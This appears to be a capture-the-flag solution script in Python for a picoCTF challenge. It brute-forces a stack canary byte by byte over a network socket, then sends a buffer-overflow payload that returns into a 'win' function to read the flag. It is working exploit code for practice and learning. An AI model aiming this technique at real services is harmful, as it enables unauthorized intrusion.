import socket
import struct
import time
import sys

HOST = 'saturn.picoctf.net'
PORT = 49178
WIN_ADDR = 0x08049336

def get_connection():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))
    return s

def bruteforce_canary():
    canary = b""
    for i in range(4): # 4 bytes of canary
        print(f"Bruteforcing byte {i+1}...")
        found = False
        # Try printable chars first as optimization, then the rest
        candidates = list(range(32, 127)) + list(range(0, 32)) + list(range(127, 256))
        
        for b in candidates:
            char = struct.pack("B", b)
            try:
                s = get_connection()
                
                # Receive prompt
                s.recv(1024)
                
                # Send length
                length = 64 + len(canary) + 1
                s.sendall(f"{length}\n".encode())
                
                # Receive "Input> "
                s.recv(1024)
                
                # Send payload
                payload = b"A" * 64 + canary + char
                s.sendall(payload)
                
                # Check response
                # We need to ensure we get the response.
                # The failure message is "Stack Smashing Detected"
                # The success message is "Ok..."
                response = s.recv(1024)
                s.close()
                
                if b"Stack Smashing Detected" not in response:
                    print(f"Found byte: {hex(b)} ({chr(b) if 32<=b<=126 else '?'})")
                    canary += char
                    found = True
                    break
            except Exception as e:
                # print(f"Error on byte {b}: {e}")
                pass
        if not found:
            print("Failed to find byte")
            sys.exit(1)
    return canary

def exploit(canary):
    print(f"Exploiting with canary: {canary.hex()}")
    try:
        s = get_connection()
        s.recv(1024)
        
        # Payload: 64 pad + canary + 16 pad + win_addr
        payload = b"A" * 64 + canary + b"B" * 16 + struct.pack("<I", WIN_ADDR)
        length = len(payload)
        
        s.sendall(f"{length}\n".encode())
        s.recv(1024)
        
        s.sendall(payload)
        
        # Read flag
        response = b""
        start = time.time()
        while time.time() - start < 2:
            try:
                chunk = s.recv(4096)
                if not chunk: break
                response += chunk
            except:
                break
        print("Response:", response.decode(errors='ignore'))
        s.close()
    except Exception as e:
        print(e)

if __name__ == "__main__":
    canary = bruteforce_canary()
    exploit(canary)
